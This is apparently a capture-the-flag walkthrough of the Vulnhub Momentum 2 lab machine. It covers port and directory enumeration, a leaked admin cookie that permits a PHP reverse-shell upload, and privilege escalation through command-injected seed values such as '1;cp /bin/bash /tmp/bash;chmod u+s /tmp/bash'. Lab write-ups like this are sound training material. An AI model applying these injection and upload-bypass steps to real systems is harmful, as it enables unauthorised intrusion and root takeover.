---
title: Vulnhub Momentum 2 Writeup
date: 2022-10-07 12:00:00 -0700
categories: [ctf]
tags: [hacking,writeup,web,linux] # TAG names should always be lowercase
---

# Momentum 2
---
Here we will be going over the Momentum 2 box from Vulnhub. This box will test your ability on enumeration, web exploitation, and Linux privilege escalation. 


## Part 1
---
Before we start. Lets add the machines IP to an environment to make things easier on us.

```shell
set IP = <box-IP>
```

Now that's done lets begin:

As with all boxes we start with our network enumeration.

```shell
nmap -sC -sV -oN nmap/initial $IP
```

Here we see we have 2 ports open:

```shell
# Nmap 7.92 scan initiated Fri Sep 23 08:36:58 2022 as: nmap -sC -sV -oN nmap/initial 172.16.42.164
Nmap scan report for 172.16.42.164
Host is up (0.00044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 02:32:8e:5b:27:a8:ea:f2:fe:11:db:2f:57:f4:11:7e (RSA)
|   256 74:35:c8:fb:96:c1:9f:a0:dc:73:6c:cd:83:52:bf:b7 (ECDSA)
|_  256 fc:4a:70:fb:b9:7d:32:89:35:0a:45:3d:d9:8b:c5:95 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Momentum 2 | Index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 23 08:37:05 2022 -- 1 IP address (1 host up) scanned in 6.70 seconds
```

Since we have a web port open running Apache we can begin enumeration on that URL using Gobuster. ( Ensure to specify the file extensions you are looking for otherwise you will be stuck on this point. )

```shell
gobuster dir -u http://$IP -w ~/Hack/wordlists/dirbuster/directory-list-2.3-medium.txt  -x .cgi,.txt,.php,.html,.py,.sh,.jpg,.png,.bak,.php.bak -t 100 
```

You should see output similar to this.

```shell
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.42.164
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /home/user/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,jpg,bak,cgi,txt,php,html,py,png,php.bak
[+] Timeout:                 10s
===============================================================
2022/10/05 19:29:36 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 312] [--> http://172.16.42.164/img/]
/index.html           (Status: 200) [Size: 1428]
/ajax.php             (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 312] [--> http://172.16.42.164/css/]
/ajax.php.bak         (Status: 200) [Size: 357]
/manual               (Status: 301) [Size: 315] [--> http://172.16.42.164/manual/]
/js                   (Status: 301) [Size: 311] [--> http://172.16.42.164/js/]
/dashboard.html       (Status: 200) [Size: 513]
/owls                 (Status: 301) [Size: 313] [--> http://172.16.42.164/owls/]
/server-status        (Status: 403) [Size: 278]

[!] Keyboard interrupt detected, terminating.
===============================================================
2022/10/05 19:31:17 Finished
===============================================================
```

We can see a few interesting files we might want to check out:
- owls
- dashboard.html
- ajax.php.bak

browsing to the first, we see a page that displays a directory tree we can access.

![[assets/images/vulnhub/momentum2/owls.png]]

Browsing to the second, we see an uploads page.

![[/assets/images/vulnhub/momentum2/dashboard.png]]

Browsing to the last, we are able to download the file.

After the download is complete we see some useful information.

```php
    //The boss told me to add one more Upper Case letter at the end of the cookie
   if(isset($_COOKIE['admin']) && $_COOKIE['admin'] == '&G6u@B6uDXMq&Ms'){

       //[+] Add if $_POST['secure'] == 'val1d'
        $valid_ext = array("pdf","php","txt");
   }
   else{

        $valid_ext = array("txt");
   }

   // Remember success upload returns 1 % 
```

Here we see that if we add the correct admin cookie and a second post parameter of secure = val1d, then we can upload .php files to the uploads page. 

To do this we can use Burpsuite to intercept the request and manipulate it to send our php reverse shell.

First lets get our PHP reverse shell from PentestMonkey and ready by adding our IP and a port we want to listen on in the fields listed in the Revshell.

Here is what needs to be added to the request as stated in the ajax.php.bak.

![[/assets/images/vulnhub/momentum2/burp1.png]]

Send the request over to intruder to find out the last digit. Add the squiggle "s" to the end of the cookie and go to payloads.

![[/assets/images/vulnhub/momentum2/request.png]]

Under payloads add uppercase letters to the list and hit start attack.

![[/assets/images/vulnhub/momentum2/burp3.png]]

You should see a "1" in the response from "R" indicating that is the letter needed. Add the letter to the end of the cookie in the proxy tab. Forward the request and the shell should go through.

Open a terminal, and open a listener on the port you put in the reverse shell. Go to the owls page and select your shell. You now have a shell on the machine!

Now that your on you can start looking for privesc routes. Being the "www" user you have basically no rights. So we need to see if their are any ways from our current user to root or another user. We see in the home directory that their is a user named "athena" and she has her password written down in a file in her directory. We use this to switch to her account. 

```shell
su athena
```

As athena we can read the user flag in her home directory.

![[/assets/images/vulnhub/momentum2/momentum-2-user-flag.png]]

Now first thing I normally do, is see if I have sudo privilege to any files or binaries.

```shell
sudo -l
```

I see that as athena we are able to run a python script as root. This script takes a seed we give it and outputs an admin cookie for the site. We can abuse this due to no input filters put in place and spawn a shell by adding this to out seed.

I tried  "bash -i" with the seed. For an example.
```shell
1;bash -i
```

It didn't quite work due to it spawning an unstable dead shell.

So I tried to add the SUID bit to bash by copying the binary to /tmp and using this in place of "/bin/bash" when running the shell.

```shell
1;cp /bin/bash /tmp/bash;chmod u+s /tmp/bash
```

Finally I can gain a root shell by using.

```shell
/tmp/bash -p
```

You now have a root shell and can retrieve the root flag.

![[/assets/images/vulnhub/momentum2/momentum-2-root-flag.png]]

This concludes the momentum series from Vulnhub! follow me on my socials for more!